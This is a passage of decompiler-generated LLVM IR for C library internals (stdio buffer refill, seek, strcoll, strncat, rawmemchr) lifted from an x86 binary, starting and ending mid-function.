  %v2_804fb7a = inttoptr i32 %v1_804fb7a to i8*
  %v3_804fb7a = load i8, i8* %v2_804fb7a, align 1
  %v4_804fb7a = zext i8 %v3_804fb7a to i32
  %v2_804fb7e = sub nsw i32 %v1_804fb75, %v4_804fb7a
  br label %dec_label_pc_804fb80

dec_label_pc_804fb80:                             ; preds = %dec_label_pc_804fb6b, %dec_label_pc_804fb5b, %dec_label_pc_804fb56, %entry, %dec_label_pc_804fb7a
  %v0_804fb95 = phi i32 [ %v1_804fb75, %dec_label_pc_804fb6b ], [ %v1_804fb58, %dec_label_pc_804fb5b ], [ 0, %dec_label_pc_804fb56 ], [ 0, %entry ], [ %v2_804fb7e, %dec_label_pc_804fb7a ]
  %v2_804fb80 = and i32 %v3_804fb4c, 64
  %v3_804fb80 = icmp eq i32 %v2_804fb80, 0
  %storemerge.in.in.v = select i1 %v3_804fb80, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_804fb44
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_804fb8d = add i32 %v4_804fb44, 16
  %v3_804fb8d = inttoptr i32 %v2_804fb8d to i32*
  %v4_804fb8d = load i32, i32* %v3_804fb8d, align 4
  %v5_804fb8d = sub i32 %storemerge, %v4_804fb8d
  %v1_804fb90 = inttoptr i32 %arg2 to i32*
  %v2_804fb90 = load i32, i32* %v1_804fb90, align 4
  store i32 %v2_804fb90, i32* %ecx.global-to-local, align 4
  %v1_804fb92 = add i32 %arg2, 4
  %v2_804fb92 = inttoptr i32 %v1_804fb92 to i32*
  %v3_804fb92 = load i32, i32* %v2_804fb92, align 4
  store i32 %v3_804fb92, i32* %ebx.global-to-local, align 4
  %v2_804fb95 = add i32 %v5_804fb8d, %v0_804fb95
  store i32 %v2_804fb95, i32* %esi.global-to-local, align 4
  %v5_804fba9 = sub i32 %v2_804fb90, %v2_804fb95
  %v10_804fba9 = icmp ult i32 %v2_804fb90, %v2_804fb95
  %v6_804fbad = zext i1 %v10_804fba9 to i32
  %tmp14 = icmp slt i32 %v2_804fb95, 0
  %v2_804fb9a.neg = zext i1 %tmp14 to i32
  %v7_804fbad = add i32 %v3_804fb92, %v2_804fb9a.neg
  %v8_804fbad = add i32 %v7_804fbad, %v6_804fbad
  store i32 %v8_804fbad, i32* @edx, align 4
  store i32 %v5_804fba9, i32* %v1_804fb90, align 4
  %v0_804fbb3 = load i32, i32* @edx, align 4
  %v1_804fbb3 = load i32, i32* %edi.global-to-local, align 4
  %v2_804fbb3 = add i32 %v1_804fbb3, 4
  %v3_804fbb3 = inttoptr i32 %v2_804fbb3 to i32*
  store i32 %v0_804fbb3, i32* %v3_804fbb3, align 4
  %v0_804fbb6 = load i32, i32* %edi.global-to-local, align 4
  %v1_804fbb6 = add i32 %v0_804fbb6, 4
  %v2_804fbb6 = inttoptr i32 %v1_804fbb6 to i32*
  %v3_804fbb6 = load i32, i32* %v2_804fbb6, align 4
  %v4_804fbb6 = load i32, i32* %ebx.global-to-local, align 4
  %v5_804fbb9 = icmp slt i32 %v3_804fbb6, %v4_804fbb6
  br i1 %v5_804fbb9, label %dec_label_pc_804fbc3, label %dec_label_pc_804fbbb

dec_label_pc_804fbbb:                             ; preds = %dec_label_pc_804fb80
  %v8_804fbbb = icmp sgt i32 %v3_804fbb6, %v4_804fbb6
  br i1 %v8_804fbbb, label %dec_label_pc_804fbc1, label %dec_label_pc_804fbbd

dec_label_pc_804fbbd:                             ; preds = %dec_label_pc_804fbbb
  %v1_804fbbd = inttoptr i32 %v0_804fbb6 to i32*
  %v2_804fbbd = load i32, i32* %v1_804fbbd, align 4
  %v3_804fbbd = load i32, i32* %ecx.global-to-local, align 4
  %tmp15 = icmp ugt i32 %v2_804fbbd, %v3_804fbbd
  br i1 %tmp15, label %dec_label_pc_804fbc1, label %dec_label_pc_804fbc3

dec_label_pc_804fbc1:                             ; preds = %dec_label_pc_804fbbd, %dec_label_pc_804fbbb
  %v0_804fbc1 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fbc1 = sub i32 0, %v0_804fbc1
  store i32 %v1_804fbc1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fbc3

dec_label_pc_804fbc3:                             ; preds = %dec_label_pc_804fbbd, %dec_label_pc_804fb80, %dec_label_pc_804fbc1
  %v0_804fbc3 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fbc3 = icmp slt i32 %v0_804fbc3, 0
  %v1_804fbc5 = icmp eq i1 %v2_804fbc3, false
  br i1 %v1_804fbc5, label %dec_label_pc_804fbd7, label %dec_label_pc_804fbc7

dec_label_pc_804fbc7:                             ; preds = %dec_label_pc_804fbc3
  %v1_804fbc7 = call i32 @__errno_location(i32 %v2_804fb95)
  %v1_804fbcc = inttoptr i32 %v1_804fbc7 to i32*
  store i32 75, i32* %v1_804fbcc, align 4
  %v0_804fbda.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fbd7

dec_label_pc_804fbd4:                             ; preds = %dec_label_pc_804fb65, %dec_label_pc_804fb60
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804fbd7

dec_label_pc_804fbd7:                             ; preds = %dec_label_pc_804fbc3, %dec_label_pc_804fbc7, %dec_label_pc_804fbd4
  %v0_804fbda = phi i32 [ %v0_804fbc3, %dec_label_pc_804fbc3 ], [ %v0_804fbda.pre, %dec_label_pc_804fbc7 ], [ -1, %dec_label_pc_804fbd4 ]
  ret i32 %v0_804fbda

; uselistorder directives
  uselistorder i32 %v4_804fbb6, { 1, 0 }
  uselistorder i32 %v3_804fbb6, { 1, 0 }
  uselistorder i32 %v2_804fb95, { 3, 0, 2, 1, 4 }
  uselistorder i32 %v1_804fb58, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_804fb44, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i16 2, { 0, 1, 4, 2, 3 }
  uselistorder i32 2048, { 3, 0, 4, 1, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804fbd7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804fbc3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fb80, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_804fbe0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804fbe8 = add i32 %arg1, 8
  %v2_804fbe8 = inttoptr i32 %v1_804fbe8 to i32*
  %v3_804fbe8 = load i32, i32* %v2_804fbe8, align 4
  store i32 %v3_804fbe8, i32* %edx.global-to-local, align 4
  %v1_804fbeb = add i32 %arg1, 12
  %v2_804fbeb = inttoptr i32 %v1_804fbeb to i32*
  %v3_804fbeb = load i32, i32* %v2_804fbeb, align 4
  %v2_804fbee = sub i32 %v3_804fbeb, %v3_804fbe8
  %v3_804fbf3 = inttoptr i32 %arg1 to i16*
  %v4_804fbf3 = call i32 @__stdio_READ(i16* %v3_804fbf3, i32 %v3_804fbe8, i32 %v2_804fbee)
  %v0_804fbf8 = load i32, i32* @ebx, align 4
  %v1_804fbf8 = add i32 %v0_804fbf8, 8
  %v2_804fbf8 = inttoptr i32 %v1_804fbf8 to i32*
  %v3_804fbf8 = load i32, i32* %v2_804fbf8, align 4
  store i32 %v3_804fbf8, i32* %edx.global-to-local, align 4
  %v2_804fbfb = add i32 %v0_804fbf8, 16
  %v3_804fbfb = inttoptr i32 %v2_804fbfb to i32*
  store i32 %v3_804fbf8, i32* %v3_804fbfb, align 4
  %v0_804fbfe = load i32, i32* %edx.global-to-local, align 4
  %v2_804fbfe = add i32 %v0_804fbfe, %v4_804fbf3
  store i32 %v2_804fbfe, i32* %edx.global-to-local, align 4
  %v1_804fc00 = load i32, i32* @ebx, align 4
  %v2_804fc00 = add i32 %v1_804fc00, 20
  %v3_804fc00 = inttoptr i32 %v2_804fc00 to i32*
  store i32 %v2_804fbfe, i32* %v3_804fc00, align 4
  store i32 %v0_804fbe0, i32* @ebx, align 4
  ret i32 %v4_804fbf3

; uselistorder directives
  uselistorder i32 %v4_804fbf3, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804fc08 = load i32, i32* @ebx, align 4
  %v4_804fc0c = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fc0c, i32* @ebx, align 4
  %v2_804fc14 = load i16, i16* %arg1, align 2
  %v3_804fc14 = zext i16 %v2_804fc14 to i32
  %v2_804fc17 = and i32 %v3_804fc14, %arg2
  %v3_804fc17 = icmp eq i32 %v2_804fc17, 0
  %v1_804fc19 = icmp eq i1 %v3_804fc17, false
  br i1 %v1_804fc19, label %dec_label_pc_804fc27, label %dec_label_pc_804fc1b

dec_label_pc_804fc1b:                             ; preds = %entry
  %v1_804fc1b = and i32 %v3_804fc14, 2176
  %v2_804fc1b = icmp eq i32 %v1_804fc1b, 0
  %v1_804fc20 = icmp eq i1 %v2_804fc1b, false
  br i1 %v1_804fc20, label %dec_label_pc_804fc2e, label %dec_label_pc_804fc22

dec_label_pc_804fc22:                             ; preds = %dec_label_pc_804fc1b
  %v2_804fc22 = or i32 %v3_804fc14, %arg2
  %v1_804fc24 = trunc i32 %v2_804fc22 to i16
  store i16 %v1_804fc24, i16* %arg1, align 2
  %v0_804fc27.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fc27

dec_label_pc_804fc27:                             ; preds = %entry, %dec_label_pc_804fc22
  %v0_804fc4d = phi i32 [ %v4_804fc0c, %entry ], [ %v0_804fc27.pre, %dec_label_pc_804fc22 ]
  %v1_804fc27 = inttoptr i32 %v0_804fc4d to i16*
  %v2_804fc27 = load i16, i16* %v1_804fc27, align 2
  %v2_804fc2a = and i16 %v2_804fc27, 16
  %v3_804fc2a = icmp eq i16 %v2_804fc2a, 0
  br i1 %v3_804fc2a, label %dec_label_pc_804fc46, label %dec_label_pc_804fc2e

dec_label_pc_804fc2e:                             ; preds = %dec_label_pc_804fc27, %dec_label_pc_804fc1b
  %v1_804fc2e = call i32 @__errno_location(i32 %v0_804fc08)
  %v1_804fc33 = inttoptr i32 %v1_804fc2e to i32*
  store i32 9, i32* %v1_804fc33, align 4
  br label %dec_label_pc_804fc39

dec_label_pc_804fc39:                             ; preds = %dec_label_pc_804fc4a, %dec_label_pc_804fc2e
  %v0_804fc39 = load i32, i32* @ebx, align 4
  %v1_804fc39 = inttoptr i32 %v0_804fc39 to i32*
  %v2_804fc39 = load i32, i32* %v1_804fc39, align 4
  %v1_804fc3b = or i32 %v2_804fc39, 8
  %v1_804fc3e = trunc i32 %v1_804fc3b to i16
  %v3_804fc3e = inttoptr i32 %v0_804fc39 to i16*
  store i16 %v1_804fc3e, i16* %v3_804fc3e, align 2
  br label %dec_label_pc_804fc72

dec_label_pc_804fc46:                             ; preds = %dec_label_pc_804fc27
  %v2_804fc46 = and i16 %v2_804fc27, 64
  %v3_804fc46 = icmp eq i16 %v2_804fc46, 0
  br i1 %v3_804fc46, label %dec_label_pc_804fc68, label %dec_label_pc_804fc4a

dec_label_pc_804fc4a:                             ; preds = %dec_label_pc_804fc46
  %v2_804fc4e = call i32 @__stdio_wcommit(i32 %v0_804fc4d)
  %v1_804fc56 = icmp eq i32 %v2_804fc4e, 0
  %v1_804fc58 = icmp eq i1 %v1_804fc56, false
  br i1 %v1_804fc58, label %dec_label_pc_804fc39, label %dec_label_pc_804fc5a

dec_label_pc_804fc5a:                             ; preds = %dec_label_pc_804fc4a
  %v0_804fc5a = load i32, i32* @ebx, align 4
  %v1_804fc5a = add i32 %v0_804fc5a, 8
  %v2_804fc5a = inttoptr i32 %v1_804fc5a to i32*
  %v3_804fc5a = load i32, i32* %v2_804fc5a, align 4
  %v2_804fc5d = add i32 %v0_804fc5a, 28
  %v3_804fc5d = inttoptr i32 %v2_804fc5d to i32*
  store i32 %v3_804fc5a, i32* %v3_804fc5d, align 4
  %v0_804fc60 = load i32, i32* @ebx, align 4
  %v1_804fc60 = inttoptr i32 %v0_804fc60 to i32*
  %v2_804fc60 = load i32, i32* %v1_804fc60, align 4
  %v2_804fc60.tr = trunc i32 %v2_804fc60 to i16
  %v1_804fc65 = and i16 %v2_804fc60.tr, -65
  %v3_804fc65 = inttoptr i32 %v0_804fc60 to i16*
  store i16 %v1_804fc65, i16* %v3_804fc65, align 2
  %v0_804fc68.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fc68

dec_label_pc_804fc68:                             ; preds = %dec_label_pc_804fc46, %dec_label_pc_804fc5a
  %v2_804fc6d = phi i32 [ %v0_804fc4d, %dec_label_pc_804fc46 ], [ %v0_804fc68.pre, %dec_label_pc_804fc5a ]
  %v1_804fc68 = inttoptr i32 %v2_804fc6d to i32*
  %v2_804fc68 = load i32, i32* %v1_804fc68, align 4
  %v1_804fc6a = or i32 %v2_804fc68, 1
  %v1_804fc6d = trunc i32 %v1_804fc6a to i16
  %v3_804fc6d = inttoptr i32 %v2_804fc6d to i16*
  store i16 %v1_804fc6d, i16* %v3_804fc6d, align 2
  br label %dec_label_pc_804fc72

dec_label_pc_804fc72:                             ; preds = %dec_label_pc_804fc39, %dec_label_pc_804fc68
  %storemerge = phi i32 [ 0, %dec_label_pc_804fc68 ], [ -1, %dec_label_pc_804fc39 ]
  %v2_804fc72 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fc72, i32* @edx, align 4
  store i32 %v0_804fc08, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_804fc14, { 0, 2, 1 }
  uselistorder i32 %v0_804fc08, { 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 4, 2, 1, 5, 3, 0 }
  uselistorder i16 0, { 0, 5, 2, 1, 6, 3, 7, 4, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fc72, { 1, 0 }
  uselistorder label %dec_label_pc_804fc68, { 1, 0 }
  uselistorder label %dec_label_pc_804fc27, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_804fc84 = add i32 %tmp5, 4
  %v2_804fc84 = inttoptr i32 %v1_804fc84 to i32*
  %v3_804fc84 = load i32, i32* %v2_804fc84, align 4
  %v2_804fc87 = load i32, i32* %arg2, align 4
  %v1_804fc8d = add i32 %arg1, 4
  %v2_804fc8d = inttoptr i32 %v1_804fc8d to i32*
  %v3_804fc8d = load i32, i32* %v2_804fc8d, align 4
  %v4_804fc90 = call i32 @__libc_lseek64(i32 %v3_804fc8d, i32 %v2_804fc87, i32 %v3_804fc84, i32 %arg3)
  %v0_804fc98 = load i32, i32* @edx, align 4
  %v2_804fc98 = icmp slt i32 %v0_804fc98, 0
  store i32 %v4_804fc90, i32* %ecx.global-to-local, align 4
  br i1 %v2_804fc98, label %dec_label_pc_804fca5, label %dec_label_pc_804fc9e

dec_label_pc_804fc9e:                             ; preds = %entry
  %v1_804fc9e = load i32, i32* @ebx, align 4
  %v2_804fc9e = inttoptr i32 %v1_804fc9e to i32*
  store i32 %v4_804fc90, i32* %v2_804fc9e, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_804fca2 = load i32, i32* @edx, align 4
  %v1_804fca2 = load i32, i32* @ebx, align 4
  %v2_804fca2 = add i32 %v1_804fca2, 4
  %v3_804fca2 = inttoptr i32 %v2_804fca2 to i32*
  store i32 %v0_804fca2, i32* %v3_804fca2, align 4
  %v0_804fca6.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fca5

dec_label_pc_804fca5:                             ; preds = %entry, %dec_label_pc_804fc9e
  %v0_804fca6 = phi i32 [ %v4_804fc90, %entry ], [ %v0_804fca6.pre, %dec_label_pc_804fc9e ]
  ret i32 %v0_804fca6

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_804fca5, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_804fcae = ptrtoint i8* %arg1 to i32
  %v4_804fcb6.pre = load i32, i32* @eax, align 4
  %v8_804fcb6.pre = load i1, i1* @df, align 1
  %v9_804fcb6 = select i1 %v8_804fcb6.pre, i32 -1, i32 1
  br label %dec_label_pc_804fcb6

dec_label_pc_804fcb6:                             ; preds = %dec_label_pc_804fcba, %entry
  %v20_804fcb7 = phi i32 [ %v23_804fcb7, %dec_label_pc_804fcba ], [ %arg2, %entry ]
  %v4_804fcb6 = phi i32 [ %v6_804fcb6, %dec_label_pc_804fcba ], [ %v4_804fcb6.pre, %entry ]
  %v7_804fcb6 = phi i32 [ %v10_804fcb6, %dec_label_pc_804fcba ], [ %v4_804fcae, %entry ]
  %v1_804fcb6 = inttoptr i32 %v7_804fcb6 to i8*
  %v2_804fcb6 = load i8, i8* %v1_804fcb6, align 1
  %v3_804fcb7 = inttoptr i32 %v20_804fcb7 to i8*
  %v4_804fcb7 = load i8, i8* %v3_804fcb7, align 1
  %v15_804fcb7 = icmp eq i8 %v2_804fcb6, %v4_804fcb7
  %v1_804fcb8 = icmp eq i1 %v15_804fcb7, false
  br i1 %v1_804fcb8, label %dec_label_pc_804fcc2, label %dec_label_pc_804fcba

dec_label_pc_804fcba:                             ; preds = %dec_label_pc_804fcb6
  %v3_804fcb6 = zext i8 %v2_804fcb6 to i32
  %v5_804fcb6 = and i32 %v4_804fcb6, -256
  %v6_804fcb6 = or i32 %v3_804fcb6, %v5_804fcb6
  %v23_804fcb7 = add i32 %v20_804fcb7, %v9_804fcb6
  %v10_804fcb6 = add i32 %v7_804fcb6, %v9_804fcb6
  %v4_804fcba = icmp eq i8 %v2_804fcb6, 0
  %v1_804fcbc = icmp eq i1 %v4_804fcba, false
  br i1 %v1_804fcbc, label %dec_label_pc_804fcb6, label %dec_label_pc_804fcc6

dec_label_pc_804fcc2:                             ; preds = %dec_label_pc_804fcb6
  br label %dec_label_pc_804fcc6

dec_label_pc_804fcc6:                             ; preds = %dec_label_pc_804fcba, %dec_label_pc_804fcc2
  %storemerge = phi i32 [ 1, %dec_label_pc_804fcc2 ], [ 0, %dec_label_pc_804fcba ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_804fcb6, { 1, 2, 0 }
  uselistorder i32 %v9_804fcb6, { 1, 0 }
  uselistorder label %dec_label_pc_804fcc6, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804fccf = load i32, i32* @esi, align 4
  store i32 %v0_804fccf, i32* %stack_var_-8, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_804fcd3 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_804fcd3, i32* %esi.global-to-local, align 4
  %v4_804fcdb = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_804fcdf = call i32 @_strlen(i8* %v4_804fcdb)
  %v2_804fce1 = add i32 %tmp, -1
  store i32 %v2_804fce1, i32* %edi.global-to-local, align 4
  %v8_804fce513 = icmp eq i32 %tmp4, 0
  store i32 %tmp4, i32* %ecx.global-to-local, align 4
  br i1 %v8_804fce513, label %dec_label_pc_804fcf0, label %dec_label_pc_804fce8.lr.ph

dec_label_pc_804fce8.lr.ph:                       ; preds = %entry
  %v4_804fce8.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_804fce8.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_804fce8

dec_label_pc_804fce8:                             ; preds = %dec_label_pc_804fce8.lr.ph, %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge
  %v8_804fce8 = phi i1 [ %v8_804fce8.pre, %dec_label_pc_804fce8.lr.ph ], [ %v5_804fce9, %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge ]
  %v4_804fce8 = phi i32 [ %v4_804fce8.pre, %dec_label_pc_804fce8.lr.ph ], [ %v0_804fcea, %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge ]
  %v2_804fcf215 = phi i32 [ %v2_804fce1, %dec_label_pc_804fce8.lr.ph ], [ %v7_804fce9, %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge ]
  %v0_804fce8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fce8 = inttoptr i32 %v0_804fce8 to i8*
  %v2_804fce8 = load i8, i8* %v1_804fce8, align 1
  %v3_804fce8 = zext i8 %v2_804fce8 to i32
  %v5_804fce8 = and i32 %v4_804fce8, -256
  %v6_804fce8 = or i32 %v5_804fce8, %v3_804fce8
  store i32 %v6_804fce8, i32* %eax.global-to-local, align 4
  %v9_804fce8 = select i1 %v8_804fce8, i32 -1, i32 1
  %v10_804fce8 = add i32 %v9_804fce8, %v0_804fce8
  store i32 %v10_804fce8, i32* %esi.global-to-local, align 4
  %v3_804fce9 = inttoptr i32 %v2_804fcf215 to i8*
  store i8 %v2_804fce8, i8* %v3_804fce9, align 1
  %v4_804fce9 = load i32, i32* %edi.global-to-local, align 4
  %v5_804fce9 = load i1, i1* @df, align 1
  %v6_804fce9 = select i1 %v5_804fce9, i32 -1, i32 1
  %v7_804fce9 = add i32 %v6_804fce9, %v4_804fce9
  store i32 %v7_804fce9, i32* %edi.global-to-local, align 4
  %v0_804fcea = load i32, i32* %eax.global-to-local, align 4
  %v3_804fcea = trunc i32 %v0_804fcea to i8
  %v4_804fcea = icmp eq i8 %v3_804fcea, 0
  %v1_804fcec = icmp eq i1 %v4_804fcea, false
  br i1 %v1_804fcec, label %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge, label %dec_label_pc_804fcf3

dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge: ; preds = %dec_label_pc_804fce8
  %v0_804fce5.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804fce5 = add i32 %v0_804fce5.pre, -1
  %v8_804fce5 = icmp eq i32 %v1_804fce5, 0
  store i32 %v1_804fce5, i32* %ecx.global-to-local, align 4
  br i1 %v8_804fce5, label %dec_label_pc_804fcf0, label %dec_label_pc_804fce8

dec_label_pc_804fcf0:                             ; preds = %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge, %entry
  %v2_804fcf2.lcssa = phi i32 [ %v2_804fce1, %entry ], [ %v7_804fce9, %dec_label_pc_804fce8.dec_label_pc_804fce5_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_804fcf2 = inttoptr i32 %v2_804fcf2.lcssa to i8*
  store i8 0, i8* %v3_804fcf2, align 1
  %v4_804fcf2 = load i32, i32* %edi.global-to-local, align 4
  %v5_804fcf2 = load i1, i1* @df, align 1
  %v6_804fcf2 = select i1 %v5_804fcf2, i32 -1, i32 1
  %v7_804fcf2 = add i32 %v6_804fcf2, %v4_804fcf2
  store i32 %v7_804fcf2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804fcf3

dec_label_pc_804fcf3:                             ; preds = %dec_label_pc_804fce8, %dec_label_pc_804fcf0
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_804fcf7 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804fcf7, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_804fce5, { 1, 0 }
  uselistorder i32 %v0_804fcea, { 1, 0 }
  uselistorder i32 %v7_804fce9, { 0, 2, 1 }
  uselistorder i1 %v5_804fce9, { 1, 0 }
  uselistorder i32 %tmp4, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804fcf3, { 1, 0 }
  uselistorder label %dec_label_pc_804fce8, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_804fcfd = load i32, i32* @ebx, align 4
  %v4_804fcfe = urem i32 %arg2, 256
  %v4_804fd02 = ptrtoint i8* %arg1 to i32
  %v2_804fd0d3 = urem i32 %v4_804fd02, 4
  %v3_804fd0d4 = icmp eq i32 %v2_804fd0d3, 0
  %v1_804fd0f8 = icmp eq i1 %v3_804fd0d4, false
  %v4_804fd08 = trunc i32 %arg2 to i8
  br i1 %v1_804fd0f8, label %dec_label_pc_804fd08, label %dec_label_pc_804fd11

dec_label_pc_804fd08:                             ; preds = %entry, %dec_label_pc_804fd0c
  %v0_804fd0c = phi i32 [ %v1_804fd0c, %dec_label_pc_804fd0c ], [ %v4_804fd02, %entry ]
  %v1_804fd08 = inttoptr i32 %v0_804fd0c to i8*
  %v2_804fd08 = load i8, i8* %v1_804fd08, align 1
  %v15_804fd08 = icmp eq i8 %v2_804fd08, %v4_804fd08
  br i1 %v15_804fd08, label %dec_label_pc_804fd5c, label %dec_label_pc_804fd0c

dec_label_pc_804fd0c:                             ; preds = %dec_label_pc_804fd08
  %v1_804fd0c = add i32 %v0_804fd0c, 1
  %v2_804fd0d = urem i32 %v1_804fd0c, 4
  %v3_804fd0d = icmp eq i32 %v2_804fd0d, 0
  %v1_804fd0f = icmp eq i1 %v3_804fd0d, false
  br i1 %v1_804fd0f, label %dec_label_pc_804fd08, label %dec_label_pc_804fd11

dec_label_pc_804fd11:                             ; preds = %entry, %dec_label_pc_804fd0c
  %v0_804fd14 = phi i32 [ %v1_804fd0c, %dec_label_pc_804fd0c ], [ %v4_804fd02, %entry ]
  %v2_804fd18 = mul nuw nsw i32 %v4_804fcfe, 256
  %v2_804fd1b = or i32 %v2_804fd18, %v4_804fcfe
  %v2_804fd1f = mul i32 %v2_804fd1b, 65536
  %v2_804fd22 = or i32 %v2_804fd1f, %v2_804fd1b
  br label %dec_label_pc_804fd24

dec_label_pc_804fd24:                             ; preds = %dec_label_pc_804fd54, %dec_label_pc_804fd24, %dec_label_pc_804fd11
  %v0_804fd28 = phi i32 [ %v0_804fd14, %dec_label_pc_804fd11 ], [ %v1_804fd28, %dec_label_pc_804fd24 ], [ %v1_804fd28, %dec_label_pc_804fd54 ]
  %v2_804fd26 = inttoptr i32 %v0_804fd28 to i32*
  %v3_804fd26 = load i32, i32* %v2_804fd26, align 4
  %v4_804fd26 = xor i32 %v3_804fd26, %v2_804fd22
  %v1_804fd28 = add i32 %v0_804fd28, 4
  %v1_804fd2b = add i32 %v4_804fd26, 2130640639
  %v1_804fd31 = sub i32 -1, %v4_804fd26
  %v2_804fd33 = xor i32 %v1_804fd2b, %v1_804fd31
  %v1_804fd35 = and i32 %v2_804fd33, -2130640640
  %v2_804fd35 = icmp eq i32 %v1_804fd35, 0
  br i1 %v2_804fd35, label %dec_label_pc_804fd24, label %dec_label_pc_804fd3c

dec_label_pc_804fd3c:                             ; preds = %dec_label_pc_804fd24
  %v2_804fd3c = inttoptr i32 %v0_804fd28 to i8*
  %v3_804fd3c = load i8, i8* %v2_804fd3c, align 1
  %v16_804fd3c = icmp eq i8 %v3_804fd3c, %v4_804fd08
  br i1 %v16_804fd3c, label %dec_label_pc_804fd5c, label %dec_label_pc_804fd44

dec_label_pc_804fd44:                             ; preds = %dec_label_pc_804fd3c
  %v1_804fd44 = add i32 %v0_804fd28, 1
  %v2_804fd44 = inttoptr i32 %v1_804fd44 to i8*
  %v3_804fd44 = load i8, i8* %v2_804fd44, align 1
  %v16_804fd44 = icmp eq i8 %v3_804fd44, %v4_804fd08
  br i1 %v16_804fd44, label %dec_label_pc_804fd5c, label %dec_label_pc_804fd4c

dec_label_pc_804fd4c:                             ; preds = %dec_label_pc_804fd44
  %v1_804fd4c = add i32 %v0_804fd28, 2
  %v2_804fd4c = inttoptr i32 %v1_804fd4c to i8*
  %v3_804fd4c = load i8, i8* %v2_804fd4c, align 1
  %v16_804fd4c = icmp eq i8 %v3_804fd4c, %v4_804fd08
  br i1 %v16_804fd4c, label %dec_label_pc_804fd5c, label %dec_label_pc_804fd54

dec_label_pc_804fd54:                             ; preds = %dec_label_pc_804fd4c
  %v1_804fd54 = add i32 %v0_804fd28, 3
  %v2_804fd54 = inttoptr i32 %v1_804fd54 to i8*
  %v3_804fd54 = load i8, i8* %v2_804fd54, align 1
  %v16_804fd54 = icmp eq i8 %v3_804fd54, %v4_804fd08
  %v1_804fd5a = icmp eq i1 %v16_804fd54, false
  br i1 %v1_804fd5a, label %dec_label_pc_804fd24, label %dec_label_pc_804fd5c

dec_label_pc_804fd5c:                             ; preds = %dec_label_pc_804fd08, %dec_label_pc_804fd54, %dec_label_pc_804fd4c, %dec_label_pc_804fd44, %dec_label_pc_804fd3c
